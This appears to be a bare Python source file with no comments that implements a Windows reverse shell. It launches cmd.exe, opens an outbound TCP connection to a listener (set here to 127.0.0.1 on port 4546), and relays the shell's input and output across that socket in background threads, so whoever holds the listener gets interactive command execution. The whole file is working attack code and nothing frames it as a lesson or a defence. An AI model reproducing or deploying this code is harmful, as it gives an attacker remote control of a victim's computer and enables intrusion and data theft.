
import argparse
import socket
import subprocess
import sys
import threading
import os
import time
from win32com.shell import shell

def shellstdout_sender(client, myshellproc):
    
    while True:
        output=myshellproc.stdout.read1()
        try:
            client.send(output)
        except:
            print("connection died...")
            subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
            client.close()
            os._exit(0) 
    
def shellstderr_sender(client, myshellproc):
    
    while True:
        output=myshellproc.stderr.read1()
        try:
            client.send(output)
        except:
            print("connection died...")
            subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
            client.close()
            os._exit(0) 
            
def shellreceiver(client, myshellproc):
    while True:
        try:
            data = client.recv(1024)
            if len(data) > 0:
                if ":leave:" in data.decode("UTF-8"):
                    subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
                    client.close()
                    os._exit(0) 
                myshellproc.stdin.write(data)
                myshellproc.stdin.flush()
        except:
            print("connection died...")
            subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
            client.close()
            os._exit(0) 
        
            


myshellproc = subprocess.Popen("cmd.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)



host="127.0.0.1"
port=4546
    
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client.connect((host, port))
except:
    print("server/socket must have died...time to hop off")
    os._exit(0) 
s2p_thread = threading.Thread(target=shellstdout_sender, args=[client, myshellproc])
s2p_thread.daemon = True
s2p_thread.start()

s2p_thread = threading.Thread(target=shellstderr_sender, args=[client, myshellproc])
s2p_thread.daemon = True
s2p_thread.start()

s2p_thread = threading.Thread(target=shellreceiver, args=[client, myshellproc])
s2p_thread.daemon = True
s2p_thread.start()

while True:
    time.sleep(1)